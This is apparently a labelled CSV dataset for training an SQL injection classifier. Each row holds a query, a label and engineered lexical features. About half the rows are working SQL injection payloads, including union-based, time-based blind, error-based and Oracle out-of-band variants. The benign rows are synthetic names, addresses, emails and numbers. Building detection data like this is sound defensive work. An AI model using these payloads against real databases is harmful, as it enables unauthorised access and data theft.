Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",1,or updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71,94,8,1,0,7,0,3,1,0,33,2,3
-1354)) or 8571=8571--,1,or,22,1,0,0,1,1,2,1,3,2,0,0
nava de bjar,0,nava de bjar,12,3,0,0,0,0,2,0,0,10,0,0
1' rlike (select * from (select(sleep(5)))sgvo) and 'vnkr' like 'vnkr,1,rlike select from select sleep sgvo and vnkr like vnkr,69,10,4,0,0,0,9,1,1,45,6,1
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='",1,and extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71 and,105,9,4,0,9,0,5,2,0,40,3,3
"c/ fontanelles, 196,",0,fontanelles,20,1,0,0,2,0,2,0,1,12,0,0
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""swec"" like ""swec",1,select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and swec like swec,114,17,0,4,10,0,12,1,1,75,4,1
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,93,13,0,1,11,1,8,0,3,60,2,1
joan pelliser,0,joan pelliser,13,2,0,0,0,0,1,0,0,12,0,0
cane5o,0,cane5o,6,1,0,0,0,0,0,0,0,5,0,0
7666460029738411,0,,16,0,0,0,0,0,0,0,0,0,0,0
arjan,0,arjan,5,1,0,0,0,0,0,0,0,5,0,0
denis-focas@007tv.gf,0,denis focas 007tv gf,20,4,0,0,2,0,0,0,1,14,0,0
"-4927')) union all select 1924,1924#",1,union all select,36,3,1,0,2,1,4,0,1,14,3,0
astigarraga,0,astigarraga,11,1,0,0,0,0,0,0,0,11,0,0
brivio,0,brivio,6,1,0,0,0,0,0,0,0,6,0,0
"1%"" union all select null,null,null,null,null#",1,union all select null null null null null,46,8,0,1,6,1,4,0,0,34,8,0
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,108,20,0,1,8,0,13,1,1,72,7,1
"1) where 5232=5232 union all select null,null,null#",1,where union all select null null null,51,7,0,0,4,1,6,0,0,31,7,0
"calle s'arraval, 114",0,calle arraval,20,2,1,0,1,0,2,0,0,13,0,0
leafloor,0,leafloor,8,1,0,0,0,0,0,0,0,8,0,0
"1'+(select vlut where 9517=9517 union all select null,null,null--",1,select vlut where union all select null null null,65,9,1,0,3,1,7,0,3,41,8,0
dept.,0,dept,5,1,0,0,1,0,0,0,0,4,0,0
hitchcoc,0,hitchcoc,8,1,0,0,0,0,0,0,0,8,0,0
"passatge joan casas 152, 4c",0,passatge joan casas 4c,27,4,0,0,1,0,4,0,0,18,0,0
"masia can ruti 142, 1-b",0,masia can ruti,23,3,0,0,1,0,4,0,1,13,0,0
farmacoplica,0,farmacoplica,12,1,0,0,0,0,0,0,0,12,0,0
a4go37a,0,a4go37a,7,1,0,0,0,0,0,0,0,4,0,0
"1%' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and '%'='",1,and char char char char regexp_substring repeat right char null and,121,11,4,0,14,0,4,2,0,56,4,8
follett,0,follett,7,1,0,0,0,0,0,0,0,7,0,0
96622444l,0,96622444l,9,1,0,0,0,0,0,0,0,1,0,0
2797487498491487,0,,16,0,0,0,0,0,0,0,0,0,0,0
walker,0,walker,6,1,0,0,0,0,0,0,0,6,0,0
estasio,0,estasio,7,1,0,0,0,0,0,0,0,7,0,0
"-6587') union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1,union all select,76,3,1,0,9,1,4,0,3,14,3,0
18311,0,,5,0,0,0,0,0,0,0,0,0,0,0
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1,select case when then else select from information_schema character_sets end,112,10,1,0,7,1,11,0,1,65,8,0
0y,0,0y,2,1,0,0,0,0,0,0,0,1,0,0
schweiger_blanc@restaurantepicopico.rw,0,schweiger_blanc restaurantepicopico rw,38,3,0,0,3,0,0,0,0,35,0,0
w,0,,1,0,0,0,0,0,0,0,0,1,0,0
"1"") as nyzd where 5305=5305;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,as nyzd where call regexp_substring repeat left crypt_key char char char null null,128,13,0,1,12,1,5,0,2,68,6,7
73361115q,0,73361115q,9,1,0,0,0,0,0,0,0,1,0,0
calleja,0,calleja,7,1,0,0,0,0,0,0,0,7,0,0
12361918q,0,12361918q,9,1,0,0,0,0,0,0,0,1,0,0
oke,0,oke,3,1,0,0,0,0,0,0,0,3,0,0
saetill.a,0,saetill,9,1,0,0,1,0,0,0,0,8,0,0
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('dssx' like 'dssx",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3 and dssx like dssx,121,20,4,0,6,0,15,2,1,79,8,1
"1))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9184=9184",1,and convert int select char char char char char select case when then char else char end char char char char char and,217,23,0,0,4,0,13,2,10,95,9,12
0esino1o,0,0esino1o,8,1,0,0,0,0,0,0,0,6,0,0
"1')) as rxhe where 3838=3838 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,as rxhe where or select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,130,19,1,0,7,1,15,1,3,82,8,1
1;select pg_sleep(5)-- ojzt,1,select pg_sleep ojzt,27,3,0,0,2,1,2,0,2,17,1,1
83497200r,0,83497200r,9,1,0,0,0,0,0,0,0,1,0,0
"1%"")) union all select null--",1,union all select null,29,4,0,1,1,1,4,0,2,18,4,0
"-9439"") where 9460=9460 or (9497=9586)*9586--",1,where or,45,2,0,1,2,1,4,1,4,7,2,0
"1') where 6731=6731 or elt(5873=5873,sleep(5))#",1,where or elt sleep,47,4,1,0,4,1,4,1,0,15,2,2
69054908f,0,69054908f,9,1,0,0,0,0,0,0,0,1,0,0
gu5cima,0,gu5cima,7,1,0,0,0,0,0,0,0,6,0,0
1) as tykp where 6851=6851;waitfor delay '0:0:5'--,1,as tykp where waitfor delay,50,5,2,0,4,1,6,0,2,23,2,2
"1"")) as aozi where 3354=3354 waitfor delay '0:0:5'--",1,as aozi where waitfor delay,52,5,2,1,3,1,7,0,2,23,2,2
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""kcxw""=""kcxw",1,and dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and kcxw kcxw,228,24,0,4,27,0,14,2,0,102,9,12
1 where 5359=5359 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1,where and utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,218,22,0,0,27,1,14,1,2,94,9,10
"-3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",1,or utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and erua erua,227,24,0,4,27,0,14,2,1,99,9,10
"1"" where 1234=1234;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,where select like abcdefg upper hex randomblob,79,7,2,1,3,1,3,0,3,40,3,3
c/ crevillente 63,0,crevillente,17,1,0,0,0,0,2,0,1,12,0,0
2frqtyrr,0,2frqtyrr,8,1,0,0,0,0,0,0,0,7,0,0
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))-- nqdb",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 nqdb,110,12,0,0,6,1,8,1,3,47,5,3
-9700') or 8811=7862,1,or,20,1,1,0,1,0,2,1,1,2,0,0
aguja,0,aguja,5,1,0,0,0,0,0,0,0,5,0,0
"-3975') or make_set(1943=3499,3499) and ('dawb'='dawb",1,or make_set and dawb dawb,53,5,4,0,4,0,4,2,1,20,2,1
gater9,0,gater9,6,1,0,0,0,0,0,0,0,5,0,0
8520642670287653,0,,16,0,0,0,0,0,0,0,0,0,0,0
"calle la corta, 85",0,calle la corta,18,3,0,0,1,0,3,0,0,12,0,0
"1"")) as hace where 8785=8785;begin user_lock.sleep(5); end--",1,as hace where begin user_lock sleep end,60,7,0,1,5,1,6,0,2,32,4,1
"c/ princesa guajara, 95 13?e",0,princesa guajara,28,2,0,0,2,0,4,0,1,17,0,0
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# miji",1,and select count from domain domains as t1 domain columns as t2 domain tables as t3 miji,101,17,0,0,7,1,12,1,1,69,6,1
lacosta estrader,0,lacosta estrader,16,2,0,0,0,0,1,0,0,15,0,0
29127,0,,5,0,0,0,0,0,0,0,0,0,0,0
"-2798'+(select 'emui' where 9565=9565 union all select 9565,9565,9565,9565--",1,select emui where union all select,76,6,3,0,4,1,7,0,4,29,5,0
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1,union all select,69,3,1,0,9,1,4,0,1,14,3,0
renta,0,renta,5,1,0,0,0,0,0,0,0,5,0,0
1) where 2307=2307;select (case when (1946=1302) then 1946 else 1/(select 0) end)--,1,where select case when then else select end,83,8,0,0,3,1,11,0,3,36,8,0
crespo bullones,0,crespo bullones,15,2,0,0,0,0,1,0,0,14,0,0
oliveras dotras,0,oliveras dotras,15,2,0,0,0,0,1,0,0,14,0,0
kurtiz_saiah4@magadan.com.ro,0,kurtiz_saiah4 magadan com ro,28,4,0,0,4,0,0,0,0,23,0,0
"1%') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,or like abcdefg upper hex randomblob,66,6,3,0,3,1,2,1,3,31,2,3
"(select count(*) from generate_series(1,5000000))",1,select count from generate_series,49,4,0,0,2,0,3,0,1,29,2,1
"cabanyes, les",0,cabanyes les,13,2,0,0,1,0,1,0,0,11,0,0
portas casola,0,portas casola,13,2,0,0,0,0,1,0,0,12,0,0
dillon@indagacion.pa,0,dillon indagacion pa,20,3,0,0,2,0,0,0,0,18,0,0
09515,0,,5,0,0,0,0,0,0,0,0,0,0,0
pericak,0,pericak,7,1,0,0,0,0,0,0,0,7,0,0
"c/ l' or, 125",0,or,13,1,1,0,1,0,3,1,1,4,0,0
-4758%')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('%'=',1,or qqpjq select case when then else end from rdb database qzvzq and,114,13,8,0,9,0,15,2,1,55,9,1
1%' order by 1#,1,order by,15,2,1,0,2,1,3,0,0,7,2,0
byrgesen,0,byrgesen,8,1,0,0,0,0,0,0,0,8,0,0
pomeroy5,0,pomeroy5,8,1,0,0,0,0,0,0,0,7,0,0
marijke,0,marijke,7,1,0,0,0,0,0,0,0,7,0,0
thomson.kmit9@somagel.sk,0,thomson kmit9 somagel sk,24,4,0,0,3,0,0,0,0,20,0,0
6968107643811968,0,,16,0,0,0,0,0,0,0,0,0,0,0
1) where 1096=1096;if(7899=7899) select 7899 else drop function zbbp--,1,where if select else drop function zbbp,70,7,0,0,3,1,8,0,2,33,5,1
pennie,0,pennie,6,1,0,0,0,0,0,0,0,6,0,0
deyecta,0,deyecta,7,1,0,0,0,0,0,0,0,7,0,0
azorin 35 1b,0,azorin 1b,12,2,0,0,0,0,2,0,0,7,0,0
"1"")) union all select null,null,null,null,null,null--",1,union all select null null null null null null,53,9,0,1,5,1,4,0,2,38,9,0
tiberio,0,tiberio,7,1,0,0,0,0,0,0,0,7,0,0
1) where 1487=1487;begin dbms_lock.sleep(5); end--,1,where begin dbms_lock sleep end,50,5,0,0,5,1,4,0,2,26,3,1
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""xqgt"" like ""xqgt",1,or select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and xqgt like xqgt,124,20,0,4,6,0,15,2,1,86,8,1
objio,0,objio,5,1,0,0,0,0,0,0,0,5,0,0
argentino,0,argentino,9,1,0,0,0,0,0,0,0,9,0,0
"1')) union all select null,null,null#",1,union all select null null null,37,6,1,0,3,1,4,0,0,26,6,0
argelita,0,argelita,8,1,0,0,0,0,0,0,0,8,0,0
8285,0,,4,0,0,0,0,0,0,0,0,0,0,0
"-7043"") where 9755=9755 union all select 9755,9755,9755,9755,9755,9755#",1,where union all select,71,4,0,1,7,1,6,0,1,19,4,0
5786008196722373,0,,16,0,0,0,0,0,0,0,0,0,0,0
87337571q,0,87337571q,9,1,0,0,0,0,0,0,0,1,0,0
cambiazo,0,cambiazo,8,1,0,0,0,0,0,0,0,8,0,0
querol jopia,0,querol jopia,12,2,0,0,0,0,1,0,0,11,0,0
1%')) union all select null--,1,union all select null,29,4,1,0,1,1,4,0,2,18,4,0
plaza tilos s/n,0,plaza tilos,15,2,0,0,0,0,2,0,1,12,0,0
"1""))) union all select null,null,null,null,null,null#",1,union all select null null null null null null,53,9,0,1,6,1,4,0,0,38,9,0
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""ljkg""=""ljkg",1,or dbms_pipe receive_message chr chr chr chr and ljkg ljkg,93,10,0,4,12,0,4,2,0,47,2,6
despestaar,0,despestaar,10,1,0,0,0,0,0,0,0,10,0,0
37711,0,,5,0,0,0,0,0,0,0,0,0,0,0
us0j6,0,us0j6,5,1,0,0,0,0,0,0,0,3,0,0
1' in boolean mode) order by 1--,1,in boolean mode order by,32,5,1,0,0,1,6,0,2,20,3,0
efrn,0,efrn,4,1,0,0,0,0,0,0,0,4,0,0
vadell comalada,0,vadell comalada,15,2,0,0,0,0,1,0,0,14,0,0
4238960811185827,0,,16,0,0,0,0,0,0,0,0,0,0,0
7652411292713718,0,,16,0,0,0,0,0,0,0,0,0,0,0
"-2901"" or elt(9866=9099,9099) and ""asib"" like ""asib",1,or elt and asib like asib,51,6,0,4,2,0,6,2,1,20,3,1
),0,,2,0,0,0,0,0,0,0,0,0,0,0
shashi,0,shashi,6,1,0,0,0,0,0,0,0,6,0,0
cambuto,0,cambuto,7,1,0,0,0,0,0,0,0,7,0,0
1%'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1,select case when then else select from master sysdatabases end,99,10,1,0,5,1,11,0,3,53,8,0
37740,0,,5,0,0,0,0,0,0,0,0,0,0,0
d'amico urrea,0,amico urrea,13,2,1,0,0,0,1,0,0,11,0,0
"-4165"" where 1772=1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",1,where union all select,81,4,0,1,8,1,6,0,3,19,4,0
߭x,0,,2,0,0,0,0,0,0,0,0,1,0,0
-9311)) or (5065=2572)*2572 and ((1199=1199,1,or and,43,2,0,0,2,0,4,2,2,5,2,0
"1') as taay where 7027=7027 and elt(4249=4249,7259)--",1,as taay where and elt,53,5,1,0,3,1,6,1,2,17,3,1
repisa,0,repisa,6,1,0,0,0,0,0,0,0,6,0,0
5ictoriosamente,0,5ictoriosamente,15,1,0,0,0,0,0,0,0,14,0,0
"calle tampa 108, 7-g",0,calle tampa,20,2,0,0,1,0,3,0,1,11,0,0
"1)) or elt(5873=5873,sleep(5))#",1,or elt sleep,31,3,0,0,3,1,2,1,0,10,1,2
8513667184992896,0,,16,0,0,0,0,0,0,0,0,0,0,0
ketley,0,ketley,6,1,0,0,0,0,0,0,0,6,0,0
"1%""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""%""=""",1,and benchmark md5 0x76555642 and,63,5,0,4,5,0,4,2,0,18,2,2
"c/ catedratico jose maria castro, 83",0,catedratico jose maria castro,36,4,0,0,1,0,5,0,1,27,0,0
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cxor'='cxor",1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and cxor cxor,215,25,4,0,26,0,14,2,0,92,9,10
4,0,,1,0,0,0,0,0,0,0,0,0,0,0
ie,0,ie,2,1,0,0,0,0,0,0,0,2,0,0
lepe@eco-pro.mobi,0,lepe eco pro mobi,17,4,0,0,2,0,0,0,1,14,0,0
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,as xwrq where select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,120,18,0,1,7,1,13,0,3,80,7,1
clay@parcalia.ml,0,clay parcalia ml,16,3,0,0,2,0,0,0,0,14,0,0
"-1641'||(select 'jfnu' where 7682=7682 union all select 7682,7682,7682--",1,select jfnu where union all select,72,6,3,0,5,1,7,0,3,29,5,0
08739,0,,5,0,0,0,0,0,0,0,0,0,0,0
29574909z,0,29574909z,9,1,0,0,0,0,0,0,0,1,0,0
"-5573') union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1,union all select,71,3,1,0,8,1,4,0,3,14,3,0
29424173c,0,29424173c,9,1,0,0,0,0,0,0,0,1,0,0
dalia,0,dalia,5,1,0,0,0,0,0,0,0,5,0,0
ojn,0,ojn,3,1,0,0,0,0,0,0,0,3,0,0
"1%"")) and (7817=4371)*4371 and ((""%""=""",1,and and,38,2,0,4,4,0,4,2,1,6,2,0
vega de san mateo,0,vega de san mateo,17,4,0,0,0,0,3,0,0,14,0,0
78608268h,0,78608268h,9,1,0,0,0,0,0,0,0,1,0,0
"1"") as nyui where 2511=2511;iif(5257=5257,1,1/0)",1,as nyui where iif,48,4,0,1,5,0,4,0,1,14,2,0
chutas,0,chutas,6,1,0,0,0,0,0,0,0,6,0,0
sharmila,0,sharmila,8,1,0,0,0,0,0,0,0,8,0,0
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,select count from domain domains as t1 domain columns as t2 domain tables as t3,90,15,1,0,7,1,9,0,3,62,5,1
apo695169or6,0,apo695169or6,12,1,0,0,0,0,0,0,0,5,0,0
"poblado de regulares 180, 1d",0,poblado de regulares 1d,28,4,0,0,1,0,4,0,0,19,0,0
95058822y,0,95058822y,9,1,0,0,0,0,0,0,0,1,0,0
kovacs,0,kovacs,6,1,0,0,0,0,0,0,0,6,0,0
"-7565')) union all select 7745,7745,7745,7745,7745,7745#",1,union all select,56,3,1,0,6,1,4,0,1,14,3,0
dieciseisavo,0,dieciseisavo,12,1,0,0,0,0,0,0,0,12,0,0
"1"" where 6281=6281 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,125,21,0,1,9,1,15,1,3,76,8,1
"1%"") union all select null,null,null--",1,union all select null null null,38,6,0,1,3,1,4,0,2,26,6,0
combee,0,combee,6,1,0,0,0,0,0,0,0,6,0,0
"san benito, 182,",0,san benito,16,2,0,0,2,0,2,0,0,9,0,0
"el halcon 154, 8?f",0,el halcon,18,2,0,0,2,0,3,0,0,9,0,0
"1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--",1,select bldn where and select count from generate_series,92,8,1,0,4,1,8,1,4,47,5,1
 %ship,0,ship,8,1,0,0,1,0,1,0,0,4,0,0
81547343s,0,81547343s,9,1,0,0,0,0,0,0,0,1,0,0
"1%""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and,170,26,0,4,10,0,21,2,1,112,11,1
"1"")) as wugz where 5355=5355 and 3824=benchmark(5000000,md5(0x76555642))--",1,as wugz where and benchmark md5 0x76555642,74,7,0,1,3,1,6,1,2,26,3,2
"-9110"")) union all select 2263,2263,2263,2263,2263#",1,union all select,51,3,0,1,5,1,4,0,1,14,3,0
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",1,select benchmark md5 0x4c4d6142 and,55,5,4,0,5,0,3,1,0,23,2,2
basilia,0,basilia,7,1,0,0,0,0,0,0,0,7,0,0
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",1,select case when then regexp_substring repeat right char null else char char char char end from information_schema system_users,189,18,0,1,14,0,11,0,0,107,9,8
wessels,0,wessels,7,1,0,0,0,0,0,0,0,7,0,0
1' and sleep(5),1,and sleep,15,2,1,0,0,0,2,1,0,8,1,1
50650,0,,5,0,0,0,0,0,0,0,0,0,0,0
prussel@mataluenga.co,0,prussel mataluenga co,21,3,0,0,2,0,0,0,0,19,0,0
"1%')) union all select null,null,null,null,null--",1,union all select null null null null null,49,8,1,0,5,1,4,0,2,34,8,0
siurana,0,siurana,7,1,0,0,0,0,0,0,0,7,0,0
0294331048003243,0,,16,0,0,0,0,0,0,0,0,0,0,0
93128213v,0,93128213v,9,1,0,0,0,0,0,0,0,1,0,0
florescu,0,florescu,8,1,0,0,0,0,0,0,0,8,0,0
portomarn,0,portomarn,9,1,0,0,0,0,0,0,0,9,0,0
8993572479681564,0,,16,0,0,0,0,0,0,0,0,0,0,0
entresurco,0,entresurco,10,1,0,0,0,0,0,0,0,10,0,0
"1"") as pydh where 3407=3407 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,as pydh where and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,180,28,0,1,8,1,23,1,3,120,12,1
roobbie,0,roobbie,7,1,0,0,0,0,0,0,0,7,0,0
1') and (2763=4004)*4004 and ('dtts'='dtts,1,and and dtts dtts,42,4,4,0,2,0,4,2,1,14,2,0
cullie,0,cullie,6,1,0,0,0,0,0,0,0,6,0,0
hennon,0,hennon,6,1,0,0,0,0,0,0,0,6,0,0
eduarda,0,eduarda,7,1,0,0,0,0,0,0,0,7,0,0
"1') as mmhe where 2142=2142 or 8466=benchmark(5000000,md5(0x694a4745))--",1,as mmhe where or benchmark md5 0x694a4745,72,7,1,0,3,1,6,1,2,26,3,2
"-1150') as hdby where 4032=4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",1,as hdby where union all select,100,6,1,0,10,1,8,0,3,25,5,0
serban,0,serban,6,1,0,0,0,0,0,0,0,6,0,0
"1%""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""%""=""",1,or dbms_pipe receive_message chr chr chr chr and,93,8,0,4,14,0,4,2,0,39,2,6
5085,0,,4,0,0,0,0,0,0,0,0,0,0,0
65782684q,0,65782684q,9,1,0,0,0,0,0,0,0,1,0,0
8320919959502275,0,,16,0,0,0,0,0,0,0,0,0,0,0
"ronda bellesguard 125, 11?c",0,ronda bellesguard,27,2,0,0,2,0,3,0,0,17,0,0
"1"")) union all select null,null#",1,union all select null null,32,5,0,1,2,1,4,0,0,22,5,0
fabrizio,0,fabrizio,8,1,0,0,0,0,0,0,0,8,0,0
estamariu,0,estamariu,9,1,0,0,0,0,0,0,0,9,0,0
x@,0,,2,0,0,0,1,0,0,0,0,1,0,0
1' in boolean mode) and (3020=3020)*6703#,1,in boolean mode and,41,4,1,0,2,1,5,1,1,16,2,0
boykin@cienciapolicial.gr,0,boykin cienciapolicial gr,25,3,0,0,2,0,0,0,0,23,0,0
2785803703823487,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1"") where 5005=5005 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1,where procedure analyse extractvalue concat 0x5c benchmark md5 0x52515a50,111,9,0,1,5,1,4,0,2,54,1,6
50615,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1'||(select 'kyhs' from dual where 9491=9491;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,select kyhs from dual where select count from domain domains as t1 domain columns as t2 domain tables as t3,129,20,3,0,9,1,14,0,3,85,8,1
1)) as oqyo where 7995=7995;select pg_sleep(5)--,1,as oqyo where select pg_sleep,48,5,0,0,3,1,5,0,2,24,3,1
09246,0,,5,0,0,0,0,0,0,0,0,0,0,0
3203257419298834,0,,16,0,0,0,0,0,0,0,0,0,0,0
45250,0,,5,0,0,0,0,0,0,0,0,0,0,0
a,0,,1,0,0,0,0,0,0,0,0,1,0,0
eoin,0,eoin,4,1,0,0,0,0,0,0,0,4,0,0
37755,0,,5,0,0,0,0,0,0,0,0,0,0,0
jwahar,0,jwahar,6,1,0,0,0,0,0,0,0,6,0,0
05145,0,,5,0,0,0,0,0,0,0,0,0,0,0
4124162736834322,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1""))) order by 1--",1,order by,18,2,0,1,0,1,3,0,2,7,2,0
9a470ul0,0,9a470ul0,8,1,0,0,0,0,0,0,0,3,0,0
ping.kasatsu@asdn.cl,0,ping kasatsu asdn cl,20,4,0,0,3,0,0,0,0,17,0,0
"1) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3,97,16,0,0,6,1,11,1,3,64,6,1
"-7744""))) union all select 9408,9408,9408,9408--",1,union all select,48,3,0,1,3,1,4,0,3,14,3,0
,0,,1,0,0,0,0,0,0,0,0,0,0,0
rechinido,0,rechinido,9,1,0,0,0,0,0,0,0,9,0,0
(select (case when (1421=1421) then 1 else 1421*(select 1421 from master..sysdatabases) end)),1,select case when then else select from master sysdatabases end,93,10,0,0,3,0,11,0,1,53,8,0
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('kkgt'='kkgt,1,and in char char char char char select case when then char else char end char char char char char and kkgt kkgt,206,23,4,0,2,0,14,2,10,89,9,12
651,0,,3,0,0,0,0,0,0,0,0,0,0,0
pealsordo,0,pealsordo,9,1,0,0,0,0,0,0,0,9,0,0
43713,0,,5,0,0,0,0,0,0,0,0,0,0,0
-5350)) or 9323=9323#,1,or,21,1,0,0,2,1,2,1,1,2,0,0
7745667684469889,0,,16,0,0,0,0,0,0,0,0,0,0,0
1%' and 1736=4220,1,and,17,1,1,0,2,0,2,1,0,3,0,0
mochn quer,0,mochn quer,10,2,0,0,0,0,1,0,0,9,0,0
rosalia,0,rosalia,7,1,0,0,0,0,0,0,0,7,0,0
mauricio,0,mauricio,8,1,0,0,0,0,0,0,0,8,0,0
moscoso danot,0,moscoso danot,13,2,0,0,0,0,1,0,0,12,0,0
